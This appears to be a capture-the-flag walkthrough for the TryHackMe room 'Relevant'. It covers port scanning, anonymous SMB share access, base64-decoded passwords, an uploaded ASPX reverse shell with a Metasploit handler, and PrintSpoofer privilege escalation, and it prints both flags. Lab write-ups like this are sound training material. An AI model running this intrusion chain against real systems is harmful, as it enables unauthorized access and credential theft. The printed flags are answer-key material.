# Relevant

> Penetration Testing Challenge

<br>

### Process:

1. port scan:
	- scan all ports: `sudo nmap -T4 -p- 10.10.164.155`
	- scan found ports: `sudo nmap -T4 -A -p 80,135,139,445,3389,49663,49667,49670,49671 10.10.164.155`
2. enumerate port 80 and 49663
	- visit webpage (http://10.10.165.155) = default IIS homepage
	- visit webpage (http://10.10.165.155:49663) = default IIS homepage
	- run gobuster: `gobuster dir -u http://10.10.164.155 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
	- run gobuster `gobuster dir -u http://10.10.164.155:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
3. enumerate SMB
	- `smbmap -H 10.10.165.155` = failed
	- `enum4linux -A 10.10.165.155` = failed
	- `sudo nmap -p 445 --script=smb-enum-users,smb-enum-shares 10.10.164.155` = found open share "nt4wrksv"
	- connect to share: `smbclient \\\\10.10.165.155\\nt4wrksv -N`
	- found "passwords.txt" file in share -> dowload
	- found user passwords encoded -> decode with base64 utility
		- `echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d` = *Bob - !P@\$\$W0rD!123* 
		- `echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d` = *Bill - Juw4nnaM4n420696969!\$\$\$*           
	- visit open share found via web ports (80 and 49663)         
		- success at "http://10.10.164.155:49663/nt4wrksv/passwords.txt"
	- try to upload file = success
	- upload ASP reverse shell:
		- get reverse shell (aspx) from [here](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)
		- setup handler in metasploit
		- upload shell via SMB connection to "/nt4wrksv" share
	- execute shell by navigating to: `http://10.10.164.155:49663/nt4wrksv/shell.aspx`
	- get user flag:
		- `cd /users/bob/desktop` -> `type user.txt`
		- flag = **THM{fdk4ka34vk346ksxfr21tg789ktf45}**
4. enumerate RDP 
	- use credentials found to login = failed
5. enumerate MS RPC 
	- ...
6. esclate privileges:
	- find system information: `systeminfo`
	- find out privileges: `whomai /priv`
	- found out you have the *SeImpersonatePrivilege* token assigned taht lets you run code as another user ([article](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)) so use the [PrintSpoofer](https://github.com/dievus/printspoofer) exploit 
		- clone the repo
		- upload it via SMB (same as reverse shell)
		- navigate to that directory: `cd /inetpub/wwwroot/nt4wrksv`
		- execute exploit: `PrintSpoofer.exe -i -c cmd`
		- check user: `whoami`
	- get root flag:
		- `cd /users/administrator/desktop` -> `type root.txt`
		- flag = **THM{1fk5kf469devly1gl320zafgl345pv}**

